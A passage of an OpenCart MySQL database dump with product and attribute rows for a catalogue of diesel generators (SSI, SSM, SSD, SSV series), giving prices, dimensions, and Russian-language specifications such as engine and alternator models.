','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','1530.00000000',1,'260.00000000','80.00000000','175.00000000',1,1,1,1,1,17,'2016-04-21 23:30:26','2016-07-19 17:14:16',1,0,0,0,0,''),(55,'SSI-160 ','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','1600.00000000',1,'275.00000000','80.00000000','175.00000000',1,1,1,1,1,1,'2016-04-21 23:41:16','2016-07-19 17:14:24',10,0,0,0,0,''),(56,'SSI-200 ','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','2060.00000000',1,'310.00000000','105.00000000','180.00000000',1,1,1,1,1,0,'2016-04-21 23:50:52','2016-07-19 17:14:34',2,0,0,0,0,''),(57,'SSI-240 ','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','2230.00000000',1,'310.00000000','105.00000000','180.00000000',1,1,1,1,1,1,'2016-04-21 23:54:41','2016-07-19 17:14:42',0,0,0,0,0,''),(58,'SSI-400 ','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','2860.00000000',1,'345.00000000','111.00000000','190.00000000',1,1,1,1,1,0,'2016-04-21 23:59:12','2016-07-19 17:15:06',0,0,0,0,0,''),(59,'SSM-16-L ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','520.00000000',1,'140.00000000','60.00000000','120.00000000',1,1,1,1,1,47,'2016-04-22 00:06:44','2016-07-19 17:16:34',0,0,0,0,0,''),(60,'SSM-20 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','540.00000000',1,'140.00000000','60.00000000','120.00000000',1,1,1,1,1,43,'2016-04-22 00:24:21','2016-07-19 17:16:48',0,0,0,0,0,''),(61,'SSM-22 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','710.00000000',1,'200.00000000','80.00000000','155.00000000',1,1,1,1,1,11,'2016-04-22 00:27:44','2016-07-19 17:16:56',0,0,0,0,0,''),(62,'SSM-25 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','730.00000000',1,'200.00000000','80.00000000','155.00000000',1,1,1,1,1,50,'2016-04-22 01:13:09','2016-07-19 17:17:05',0,0,0,0,0,'catalog/flags/at.png'),(63,'SSM-30 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','790.00000000',1,'200.00000000','80.00000000','155.00000000',1,1,1,1,1,4,'2016-04-22 01:16:15','2016-07-19 17:17:22',0,0,0,0,0,''),(64,'SSM-40 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','810.00000000',1,'200.00000000','80.00000000','175.00000000',1,1,1,1,1,5,'2016-04-22 01:21:46','2016-07-19 17:17:31',0,0,0,0,0,''),(65,'SSM-48 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','830.00000000',1,'200.00000000','80.00000000','175.00000000',1,1,1,1,1,4,'2016-04-22 01:26:56','2016-07-19 17:17:38',0,0,0,0,0,''),(66,'SSM-60 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','890.00000000',1,'200.00000000','80.00000000','175.00000000',1,1,1,1,1,4,'2016-04-22 01:28:56','2016-07-19 17:17:47',0,0,0,0,0,''),(67,'SSM-74 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','1370.00000000',1,'250.00000000','80.00000000','175.00000000',1,1,1,1,1,7,'2016-04-22 01:31:21','2016-07-19 17:17:55',0,0,0,0,0,''),(68,'SSM-84 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','1410.00000000',1,'250.00000000','80.00000000','175.00000000',1,1,1,1,1,5,'2016-04-22 01:34:03','2016-07-19 17:18:07',0,0,0,0,0,''),(69,'SSM-100 ','','','','','','','',1,7,'catalog/SSM.png',11,1,'0.0000',0,0,'2016-04-12','1440.00000000',1,'250.00000000','80.00000000','175.00000000',1,1,1,1,1,60,'2016-04-22 01:36:07','2016-07-19 17:16:24',0,0,0,0,0,''),(72,'SSD - 25','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'9100.0000',0,0,'2016-04-12','650.00000000',1,'150.00000000','60.00000000','115.00000000',1,1,1,1,1,0,'2016-07-18 20:38:37','2016-07-19 17:12:20',0,0,0,0,0,''),(73,'SSD - 30','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'11000.0000',0,0,'2016-04-12','760.00000000',1,'170.00000000','65.00000000','125.00000000',1,1,1,1,1,2,'2016-07-18 20:43:42','2016-07-19 17:12:34',0,0,0,0,0,''),(74,'SSD - 45','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'12100.0000',0,0,'2016-04-12','900.00000000',1,'190.00000000','75.00000000','125.00000000',1,1,1,1,1,0,'2016-07-18 21:06:20','2016-07-19 17:13:08',0,0,0,0,0,''),(75,'SSD - 60','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'14900.0000',0,0,'2016-04-12','990.00000000',1,'190.00000000','75.00000000','125.00000000',1,1,1,1,1,0,'2016-07-18 21:13:44','2016-07-19 17:13:00',0,0,0,0,0,''),(76,'SSD - 80','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'17400.0000',0,0,'2016-04-12','1400.00000000',1,'235.00000000','75.00000000','160.00000000',1,1,1,1,1,1,'2016-07-18 21:17:41','2016-07-19 17:12:52',0,0,0,0,0,''),(77,'SSD - 100','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'19400.0000',0,0,'2016-04-12','1440.00000000',1,'235.00000000','75.00000000','160.00000000',1,1,1,1,1,0,'2016-07-18 21:21:16','2016-07-19 17:11:40',0,0,0,0,0,''),(78,'SSD - 120','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'23000.0000',0,0,'2016-04-12','1870.00000000',1,'275.00000000','90.00000000','170.00000000',1,1,1,1,1,0,'2016-07-18 21:26:02','2016-07-19 17:11:46',0,0,0,0,0,''),(79,'SSD - 150','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'27400.0000',0,0,'2016-04-12','1940.00000000',1,'280.00000000','100.00000000','200.00000000',1,1,1,1,1,0,'2016-07-18 21:29:47','2016-07-19 17:11:52',0,0,0,0,0,''),(80,'SSD - 200','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'31000.0000',0,0,'2016-04-12','2140.00000000',1,'290.00000000','105.00000000','180.00000000',1,1,1,1,1,0,'2016-07-18 21:33:07','2016-07-19 17:12:07',0,0,0,0,0,''),(81,'SSD - 240','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'42300.0000',0,0,'2016-04-12','2300.00000000',1,'260.00000000','135.00000000','230.00000000',1,1,1,1,1,0,'2016-07-18 21:36:36','2016-07-19 17:12:14',0,0,0,0,0,''),(82,'SSD - 280','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'44700.0000',0,0,'2016-04-12','2550.00000000',1,'260.00000000','135.00000000','230.00000000',1,1,1,1,1,0,'2016-07-18 21:40:29','2016-07-19 17:12:27',0,0,0,0,0,''),(83,'SSD - 320','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'52000.0000',0,0,'2016-04-12','2670.00000000',1,'290.00000000','155.00000000','225.00000000',1,1,1,1,1,0,'2016-07-18 21:43:25','2016-07-19 17:12:42',0,0,0,0,0,''),(84,'SSD - 360','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'54600.0000',0,0,'2016-04-12','2870.00000000',1,'290.00000000','155.00000000','225.00000000',1,1,1,1,1,0,'2016-07-18 21:46:29','2016-07-19 17:13:24',0,0,0,0,0,''),(85,'SSD - 400','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'56800.0000',0,0,'2016-04-12','3100.00000000',1,'290.00000000','185.00000000','235.00000000',1,1,1,1,1,0,'2016-07-18 21:49:09','2016-07-19 17:13:15',0,0,0,0,0,''),(86,'SSV - 80','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'23240.0000',0,0,'2016-04-12','1300.00000000',1,'215.00000000','80.00000000','175.00000000',1,1,1,1,1,0,'2016-07-18 22:37:27','2016-07-19 17:19:11',0,0,0,0,0,''),(87,'SSV - 100','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'24030.0000',0,0,'2016-04-12','1370.00000000',1,'230.00000000','80.00000000','175.00000000',1,1,1,1,1,0,'2016-07-18 22:41:07','2016-07-19 17:20:41',0,0,0,0,0,''),(88,'SSV - 120','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'33060.0000',0,0,'2016-04-12','1570.00000000',1,'235.00000000','90.00000000','175.00000000',1,1,1,1,1,0,'2016-07-18 22:43:39','2016-07-19 17:20:30',0,0,0,0,0,''),(89,'SSV - 150','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'34900.0000',0,0,'2016-04-12','1640.00000000',1,'235.00000000','103.00000000','200.00000000',1,1,1,1,1,1,'2016-07-18 22:46:02','2016-07-19 17:20:20',0,0,0,0,0,''),(90,'SSV - 200','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'38220.0000',0,0,'2016-04-12','1750.00000000',1,'265.00000000','105.00000000','180.00000000',1,1,1,1,1,0,'2016-07-18 22:48:28','2016-07-19 17:20:11',0,0,0,0,0,''),(91,'SSV - 280','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'58000.0000',0,0,'2016-04-12','2990.00000000',1,'260.00000000','105.00000000','180.00000000',1,1,1,1,1,0,'2016-07-18 22:51:01','2016-07-19 17:20:04',0,0,0,0,0,''),(92,'SSV - 320','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'59820.0000',0,0,'2016-04-12','3150.00000000',1,'320.00000000','115.00000000','200.00000000',1,1,1,1,1,0,'2016-07-18 22:53:34','2016-07-19 17:19:57',0,0,0,0,0,''),(93,'SSV - 360','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'63000.0000',0,0,'2016-04-12','3320.00000000',1,'320.00000000','115.00000000','200.00000000',1,1,1,1,1,0,'2016-07-18 22:57:26','2016-07-19 17:19:50',0,0,0,0,0,''),(94,'SSV - 400','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'64850.0000',0,0,'2016-04-12','3450.00000000',1,'340.00000000','116.00000000','210.00000000',1,1,1,1,1,0,'2016-07-18 22:59:39','2016-07-19 17:19:43',0,0,0,0,0,''),(95,'SSV - 450','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'87270.0000',0,0,'2016-04-12','3850.00000000',1,'340.00000000','116.00000000','230.00000000',1,1,1,1,1,0,'2016-07-18 23:01:51','2016-07-19 17:19:35',0,0,0,0,0,''),(96,'SSV - 500','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'95510.0000',0,0,'2016-04-12','4500.00000000',1,'360.00000000','135.00000000','245.00000000',1,1,1,1,1,0,'2016-07-18 23:04:03','2016-07-19 17:19:27',0,0,0,0,0,''),(97,'SSP - 16','','','','','','','',1,7,'',11,1,'9170.0000',0,0,'2016-04-12','560.00000000',1,'140.00000000','52.00000000','100.00000000',1,1,1,1,1,0,'2016-07-18 23:33:11','2016-07-19 18:05:02',0,0,0,0,0,''),(98,'SSV - 80','','','','','','','',1,7,'catalog/SSV.jpg',11,1,'23240.0000',0,0,'2016-04-12','1300.00000000',1,'215.00000000','80.00000000','175.00000000',1,1,1,1,0,0,'2016-07-19 17:56:56','0000-00-00 00:00:00',0,0,0,0,0,'');
/*!40000 ALTER TABLE `oc_product` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_attribute` WRITE;
/*!40000 ALTER TABLE `oc_product_attribute` DISABLE KEYS */;
INSERT INTO `oc_product_attribute` VALUES (42,20,4,'20'),(42,20,3,'20'),(42,20,1,'20'),(42,19,4,'Текст'),(42,19,3,'Текст'),(42,19,1,'Текст'),(42,17,4,'Текст'),(42,17,3,'Текст'),(42,17,1,'Текст'),(42,16,4,'70'),(42,16,3,'70'),(42,16,1,'70'),(42,15,4,'60'),(42,15,3,'60'),(42,15,1,'60'),(42,14,4,'Текст'),(42,14,3,'Текст'),(42,14,1,'Текст'),(42,13,4,'100'),(42,13,3,'100'),(42,13,1,'100'),(42,12,4,'50'),(42,12,3,'50'),(42,12,1,'50'),(55,32,1,'230/400'),(55,32,3,'230/400'),(50,18,3,'860'),(50,18,4,'860'),(50,19,1,'Дизельные генераторы SSI'),(50,19,3,'Дизельные генераторы SSI'),(50,19,4,'Дизельные генераторы SSI'),(50,20,1,'72'),(50,20,3,'72'),(50,20,4,'72'),(50,21,1,'8.6'),(50,21,3,'8.6'),(50,21,4,'8.6'),(50,23,1,'FPT (Iveco)\r\n'),(50,23,3,'FPT (Iveco)\r\n'),(50,23,4,'FPT (Iveco)\r\n'),(50,24,1,'NEF45AM2\r\n'),(50,24,3,'NEF45AM2\r\n'),(50,24,4,'NEF45AM2\r\n'),(50,25,1,'MJB 200 MA4\r\n'),(50,25,3,'MJB 200 MA4\r\n'),(50,25,4,'MJB 200 MA4\r\n'),(50,29,1,'50'),(50,29,3,'50'),(50,29,4,'50'),(50,30,1,'3'),(50,30,3,'3'),(50,30,4,'3'),(50,31,1,'0.8'),(50,31,3,'0.8'),(50,31,4,'0.8'),(50,32,1,'230/400'),(50,32,3,'230/400'),(50,32,4,'230/400'),(50,33,1,'1500'),(50,33,3,'1500'),(50,33,4,'1500'),(50,34,1,'4.6'),(50,34,3,'4.6'),(50,34,4,'4.6'),(50,36,1,'1750'),(50,36,3,'1750'),(53,37,1,'650'),(52,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(52,15,1,'105.6'),(52,15,3,'105.6'),(52,15,4,'105.6'),(52,16,1,'132'),(52,16,3,'132'),(52,16,4,'132'),(52,17,1,'68'),(52,17,3,'68'),(52,17,4,'68'),(52,18,1,'1220'),(52,18,3,'1220'),(52,18,4,'1220'),(52,19,1,'Дизельные генераторы SSI'),(52,19,3,'Дизельные генераторы SSI'),(52,19,4,'Дизельные генераторы SSI'),(52,20,1,'172.8'),(52,20,3,'172.8'),(52,20,4,'172.8'),(52,21,1,'20.3'),(52,21,3,'20.3'),(52,21,4,'20.3'),(52,23,1,'FPT (Iveco)\r\n'),(52,23,3,'FPT (Iveco)\r\n'),(53,36,4,'2000'),(53,36,3,'2000'),(53,35,4,'10.3'),(53,36,1,'2000'),(53,35,1,'10.3'),(53,35,3,'10.3'),(53,34,3,'6.9'),(53,34,4,'6.9'),(53,34,1,'6.9'),(53,33,4,'1500'),(53,33,3,'1500'),(53,33,1,'1500'),(53,32,4,'230/400'),(53,32,3,'230/400'),(53,32,1,'230/400'),(53,31,4,'0.8'),(53,31,3,'0.8'),(53,31,1,'0.8'),(53,30,4,'3'),(53,30,3,'3'),(53,29,4,'50'),(53,30,1,'3'),(53,29,1,'50'),(53,29,3,'50'),(53,25,4,'MJB 225 SA4\r\n'),(53,25,3,'MJB 225 SA4\r\n'),(53,25,1,'MJB 225 SA4\r\n'),(53,24,4,'NEF45SM3\r\n'),(53,24,3,'NEF45SM3\r\n'),(53,24,1,'NEF45SM3\r\n'),(53,23,4,'FPT (Iveco)\r\n'),(53,23,3,'FPT (Iveco)\r\n'),(53,23,1,'FPT (Iveco)\r\n'),(53,21,4,'13.8'),(53,21,3,'13.8'),(53,21,1,'13.8'),(52,23,4,'FPT (Iveco)\r\n'),(52,24,1,'NEF45TM3\r\n'),(52,24,3,'NEF45TM3\r\n'),(52,24,4,'NEF45TM3\r\n'),(52,25,1,'MJB 225 LA4\r\n'),(52,25,3,'MJB 225 LA4\r\n'),(52,25,4,'MJB 225 LA4\r\n'),(52,29,1,'50'),(52,29,3,'50'),(52,29,4,'50'),(52,30,1,'3'),(52,30,3,'3'),(52,30,4,'3'),(52,31,1,'0.8'),(52,31,3,'0.8'),(52,31,4,'0.8'),(52,32,1,'230/400'),(52,32,3,'230/400'),(52,32,4,'230/400'),(53,20,4,'115.2'),(53,20,3,'115.2'),(53,20,1,'115.2'),(50,36,4,'1750'),(53,19,4,'Дизельные генераторы SSI'),(50,37,1,'650'),(53,19,3,'Дизельные генераторы SSI'),(52,33,1,'1500'),(52,33,3,'1500'),(52,33,4,'1500'),(53,19,1,'Дизельные генераторы SSI'),(53,18,4,'1000'),(50,37,3,'650'),(50,37,4,'650'),(50,38,1,'1400'),(53,18,3,'1000'),(50,38,3,'1400'),(50,38,4,'1400'),(53,37,3,'650'),(54,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(54,15,1,'149.6'),(54,15,3,'149.6'),(54,15,4,'149.6'),(54,16,1,'187'),(54,16,3,'187'),(54,16,4,'187'),(54,17,1,'68'),(54,17,3,'68'),(54,17,4,'68'),(54,18,1,'1530'),(54,18,3,'1530'),(54,18,4,'1530'),(54,19,1,'Дизельные генераторы SSI'),(54,19,3,'Дизельные генераторы SSI'),(54,19,4,'Дизельные генераторы SSI'),(54,20,1,'244.8'),(54,20,3,'244.8'),(54,20,4,'244.8'),(54,21,1,'26.8'),(54,21,3,'26.8'),(54,21,4,'26.8'),(54,23,1,'FPT (Iveco)\r\n'),(54,23,3,'FPT (Iveco)\r\n'),(54,23,4,'FPT (Iveco)\r\n'),(54,24,1,'NEF67TM4\r\n\r\n'),(54,24,3,'NEF67TM4\r\n\r\n'),(54,24,4,'NEF67TM4\r\n'),(54,25,1,'MJB 250 MB4\r\n'),(54,25,3,'MJB 250 MB4\r\n'),(54,25,4,'MJB 250 MB4\r\n'),(54,29,1,'50'),(54,29,3,'50'),(54,29,4,'50'),(54,30,1,'3'),(54,30,3,'3'),(54,30,4,'3'),(55,12,4,'160'),(55,13,1,'200'),(55,13,3,'200'),(55,13,4,'200'),(55,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(55,29,3,'50'),(55,29,1,'50'),(55,25,4,'MJB 250 LA4\r\n'),(55,25,3,'MJB 250 LA4\r\n'),(55,25,1,'MJB 250 LA4\r\n'),(55,24,4,'NEF67TM7\r\n'),(55,24,3,'NEF67TM7\r\n\r\n'),(55,24,1,'NEF67TM7\r\n\r\n\r\n'),(55,23,4,'FPT (Iveco)\r\n'),(55,23,3,'FPT (Iveco)\r\n'),(55,23,1,'FPT (Iveco)\r\n'),(55,21,4,'30,9\r\n'),(55,21,3,'30,9\r\n'),(55,21,1,'30,9\r\n'),(55,20,4,'288'),(55,20,3,'288'),(55,20,1,'288'),(55,19,4,'Дизельные генераторы SSI'),(55,19,3,'Дизельные генераторы SSI'),(55,19,1,'Дизельные генераторы SSI'),(55,18,4,'1600'),(55,18,3,'1600'),(55,18,1,'1600'),(55,17,4,'68'),(55,17,3,'68'),(55,17,1,'68'),(55,16,4,'220'),(55,16,3,'220'),(55,16,1,'220'),(55,15,4,'176'),(55,15,3,'176'),(55,15,1,'176'),(55,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(55,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(56,16,3,'275'),(56,16,4,'275'),(56,17,1,'68'),(56,17,3,'68'),(56,17,4,'68'),(56,18,1,'2060\r\n'),(56,18,3,'2060\r\n'),(56,18,4,'2060\r\n'),(56,19,1,'Дизельные генераторы SSI'),(56,19,3,'Дизельные генераторы SSI'),(56,19,4,'Дизельные генераторы SSI'),(56,20,1,'360'),(56,20,3,'360'),(56,20,4,'360'),(56,21,1,'39,2\r\n'),(56,21,3,'39,2\r\n'),(56,21,4,'39,2\r\n'),(56,23,1,'FPT (Iveco)\r\n'),(56,23,3,'FPT (Iveco)\r\n'),(56,23,4,'FPT (Iveco)\r\n'),(56,24,1,'CURSOR 87TE3\r\n\r\n'),(56,24,3,'CURSOR 87TE3\r\n\r\n\r\n'),(56,24,4,'CURSOR 87TE3\r\n'),(56,25,1,'MJB 250 LB4\r\n'),(56,25,3,'MJB 250 LB4\r\n'),(56,25,4,'MJB 250 LB4\r\n'),(56,29,1,'50'),(56,29,3,'50'),(56,29,4,'50'),(56,30,1,'3'),(56,30,3,'3'),(56,30,4,'3'),(56,31,1,'0.8'),(56,31,3,'0.8'),(56,31,4,'0.8'),(56,32,1,'230/400'),(56,32,3,'230/400'),(56,32,4,'230/400'),(56,33,1,'1500'),(56,33,3,'1500'),(56,33,4,'1500'),(56,34,1,'21,3\r\n'),(56,34,3,'21,3\r\n'),(57,20,1,'432'),(57,20,3,'432'),(57,20,4,'432'),(57,21,1,'47,5\r\n'),(57,21,3,'47,5\r\n'),(57,21,4,'47,5\r\n'),(57,23,1,'FPT (Iveco)\r\n'),(57,23,3,'FPT (Iveco)\r\n'),(57,23,4,'FPT (Iveco)\r\n'),(57,24,1,'CURSOR 87TE4\r\n'),(57,24,3,'CURSOR 87TE4\r\n'),(57,24,4,'CURSOR 87TE4\r\n'),(57,25,1,'MJB 315 SA4\r\n'),(57,25,3,'MJB 315 SA4\r\n'),(57,25,4,'MJB 315 SA4\r\n'),(57,29,1,'50'),(57,29,3,'50'),(57,29,4,'50'),(57,30,1,'3'),(57,30,3,'3'),(57,30,4,'3'),(57,31,1,'0.8'),(57,31,3,'0.8'),(57,31,4,'0.8'),(57,32,1,'230/400'),(57,32,3,'230/400'),(58,25,3,'MJB 355 SA4\r\n\r\n'),(58,25,1,'MJB 355 SA4\r\n'),(58,24,4,'CURSOR 13TE7W\r\n'),(58,24,3,'CURSOR 13TE7W\r\n'),(58,24,1,'CURSOR 13TE7W\r\n\r\n'),(58,23,4,'FPT (Iveco)\r\n'),(58,23,3,'FPT (Iveco)\r\n'),(58,23,1,'FPT (Iveco)\r\n'),(58,21,4,'77,2\r\n\r\n'),(58,21,3,'77,2\r\n'),(58,21,1,'77,2\r\n'),(58,20,4,'720'),(58,20,3,'720'),(58,20,1,'720'),(58,19,4,'Дизельные генераторы SSI'),(58,19,3,'Дизельные генераторы SSI'),(58,19,1,'Дизельные генераторы SSI'),(58,18,4,'2860\r\n'),(58,18,3,'2860\r\n\r\n'),(58,18,1,'2860\r\n'),(58,17,4,'68'),(58,17,3,'68'),(59,16,4,'23.375'),(59,17,1,'68'),(59,17,3,'68'),(59,17,4,'68'),(59,18,1,'520\r\n'),(59,18,3,'520\r\n\r\n'),(59,18,4,'520\r\n'),(59,19,1,'Дизельные генераторы SSM'),(59,19,3,'Дизельные генераторы SSM'),(59,19,4,'Дизельные генераторы SSM'),(59,20,1,'31.68'),(59,20,3,'30.6'),(59,20,4,'30.6'),(59,21,1,'3,5\r\n'),(59,21,3,'3,5\r\n'),(59,21,4,'3,5\r\n'),(59,23,1,'ММЗ\r\n'),(59,23,3,'ММЗ\r\n'),(59,23,4,'ММЗ\r\n\r\n'),(59,24,1,'3LD\r\n\r\n'),(59,24,3,'3LD\r\n\r\n'),(59,24,4,'3LD\r\n'),(59,25,1,'E1X13M E/2\r\n'),(59,25,3,'E1X13M E/2\r\n'),(59,25,4,'E1X13M E/2\r\n'),(59,29,1,'50'),(59,29,3,'50'),(59,29,4,'50'),(59,30,1,'3'),(59,30,3,'3'),(59,30,4,'3'),(59,31,1,'0.8'),(59,31,3,'0.8'),(59,31,4,'0.8'),(59,32,1,'230/400'),(59,32,3,'230/400'),(59,32,4,'230/400'),(59,33,1,'3000\r\n'),(59,33,3,'3000\r\n'),(59,33,4,'3000\r\n'),(59,34,1,'1,9\r\n'),(59,34,3,'1,9\r\n'),(59,34,4,'1,9\r\n'),(59,36,1,'1400\r\n'),(60,32,1,'230/400'),(60,31,4,'0.8'),(60,31,3,'0.8'),(60,31,1,'0.8'),(60,30,4,'3'),(60,30,3,'3'),(60,30,1,'3'),(60,29,4,'50'),(60,29,3,'50'),(60,29,1,'50'),(60,25,4,'ECP28-2L/2\r\n\r\n'),(60,25,3,'ECP28-2L/2\r\n'),(60,25,1,'ECP28-2L/2\r\n'),(60,24,4,'3LD\r\n'),(60,24,3,'3LD\r\n\r\n'),(60,24,1,'3LD\r\n\r\n'),(60,23,4,'ММЗ\r\n\r\n'),(60,23,3,'ММЗ\r\n'),(60,23,1,'ММЗ\r\n'),(60,21,4,'4,32\r\n'),(60,21,3,'4,32\r\n'),(60,21,1,'4,32\r\n'),(60,20,4,'36'),(60,20,1,'36'),(60,20,3,'36'),(60,19,4,'Дизельные генераторы SSM'),(60,19,3,'Дизельные генераторы SSM'),(60,19,1,'Дизельные генераторы SSM'),(60,18,3,'540\r\n\r\n\r\n'),(60,18,4,'540\r\n\r\n'),(60,17,4,'68'),(60,18,1,'540\r\n'),(60,17,1,'68'),(60,17,3,'68'),(60,16,3,'27.5'),(60,16,4,'27.5'),(60,15,4,'22'),(60,16,1,'27.5'),(60,15,1,'22'),(60,15,3,'22'),(60,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(61,36,4,'2000\r\n\r\n\r\n'),(61,36,3,'2000\r\n'),(61,36,1,'2000\r\n\r\n'),(61,34,3,'2,7\r\n'),(61,34,4,'2,7\r\n\r\n'),(61,33,4,'1500\r\n'),(61,34,1,'2,7\r\n'),(61,33,1,'1500\r\n'),(61,33,3,'1500\r\n\r\n'),(61,32,4,'230/400'),(61,32,3,'230/400'),(61,32,1,'230/400'),(61,31,4,'0.8'),(61,31,3,'0.8'),(61,31,1,'0.8'),(61,30,4,'3'),(61,30,3,'3'),(61,30,1,'3'),(61,29,4,'50'),(61,29,3,'50'),(61,29,1,'50'),(61,25,4,'MJB 160 MA4\r\n\r\n'),(61,25,3,'MJB 160 MA4\r\n'),(61,25,1,'MJB 160 MA4\r\n'),(61,24,4,'Д-246.1\r\n'),(61,24,3,'Д-246.1\r\n\r\n'),(61,24,1,'Д-246.1\r\n'),(61,23,4,'ММЗ\r\n\r\n'),(61,23,3,'ММЗ\r\n'),(61,23,1,'ММЗ\r\n'),(61,21,4,'5,28\r\n'),(61,21,3,'5,28\r\n'),(61,21,1,'5,28\r\n\r\n'),(61,20,4,'39.6'),(61,20,3,'39.6'),(61,20,1,'39.6'),(61,19,4,'Дизельные генераторы SSM'),(61,19,3,'Дизельные генераторы SSM'),(61,19,1,'Дизельные генераторы SSM'),(61,18,4,'710\r\n\r\n\r\n'),(61,18,3,'710\r\n\r\n\r\n\r\n'),(61,18,1,'710\r\n'),(61,17,4,'68'),(61,17,3,'68'),(62,21,3,'5,5\r\n'),(62,21,4,'5,5\r\n\r\n'),(62,23,1,'ММЗ\r\n'),(62,23,3,'ММЗ\r\n'),(62,23,4,'ММЗ\r\n\r\n'),(62,24,1,'Д-246.1\r\n\r\n'),(62,24,3,'Д-246.1\r\n\r\n'),(62,24,4,'Д-246.1\r\n'),(62,25,1,'MJB 160 MB4\r\n'),(62,25,3,'MJB 160 MB4\r\n'),(62,25,4,'MJB 160 MB4\r\n\r\n'),(62,29,1,'50'),(62,29,3,'50'),(62,29,4,'50'),(62,30,1,'3'),(62,30,3,'3'),(62,30,4,'3'),(62,31,1,'0.8'),(62,31,3,'0.8'),(62,31,4,'0.8'),(62,32,1,'230/400'),(62,32,3,'230/400'),(62,32,4,'230/400'),(62,33,1,'1500\r\n'),(62,33,3,'1500\r\n\r\n'),(62,33,4,'1500\r\n'),(62,34,1,'2,8\r\n'),(62,34,3,'2,8\r\n'),(62,34,4,'2,8\r\n'),(62,36,1,'2000\r\n\r\n'),(63,17,3,'68'),(63,17,4,'68'),(63,18,1,'790\r\n'),(63,18,3,'790\r\n\r\n\r\n\r\n'),(63,18,4,'790\r\n\r\n'),(63,19,1,'Дизельные генераторы SSM'),(63,19,3,'Дизельные генераторы SSM'),(63,19,4,'Дизельные генераторы SSM'),(63,20,1,'54'),(63,20,3,'54'),(63,20,4,'54'),(63,21,1,'6,6\r\n'),(63,21,3,'6,6\r\n'),(63,21,4,'6,6\r\n'),(63,23,1,'ММЗ\r\n'),(63,23,3,'ММЗ\r\n'),(63,23,4,'ММЗ\r\n\r\n'),(63,24,1,'Д-246.1\r\n'),(63,24,3,'Д-246.1\r\n'),(63,24,4,'Д-246.1\r\n'),(63,25,1,'MJB 200 SA4\r\n'),(63,25,3,'MJB 200 SA4\r\n'),(63,25,4,'MJB 200 SA4\r\n'),(63,29,1,'50'),(63,29,3,'50'),(63,29,4,'50'),(63,30,1,'3'),(63,30,3,'3'),(63,30,4,'3'),(63,31,1,'0.8'),(63,31,3,'0.8'),(63,31,4,'0.8'),(63,32,1,'230/400'),(63,32,3,'230/400'),(63,32,4,'230/400'),(63,33,1,'1500\r\n'),(63,33,3,'1500\r\n\r\n'),(63,33,4,'1500\r\n'),(63,34,1,'3,4\r\n'),(63,34,3,'3,4\r\n\r\n'),(63,34,4,'3,4\r\n'),(63,36,1,'2000\r\n\r\n'),(63,36,3,'2000\r\n'),(63,36,4,'2000\r\n\r\n\r\n'),(63,37,1,'800'),(64,17,3,'68'),(64,17,4,'68'),(64,18,1,'810\r\n'),(64,18,3,'810\r\n\r\n\r\n\r\n\r\n'),(64,18,4,'810\r\n'),(64,19,1,'Дизельные генераторы SSM'),(64,19,3,'Дизельные генераторы SSM'),(64,19,4,'Дизельные генераторы SSM'),(64,20,1,'72'),(64,20,3,'72'),(64,20,4,'72'),(64,21,1,'8,4\r\n'),(64,21,3,'8,4\r\n'),(64,21,4,'8,4\r\n'),(64,23,1,'ММЗ\r\n'),(64,23,3,'ММЗ\r\n'),(64,23,4,'ММЗ\r\n\r\n'),(64,24,1,'Д-246.4\r\n'),(64,24,3,'Д-246.4\r\n\r\n'),(64,24,4,'Д-246.4\r\n'),(64,25,1,'MJB 200 SB4\r\n'),(64,25,3,'MJB 200 SB4\r\n'),(64,25,4,'MJB 200 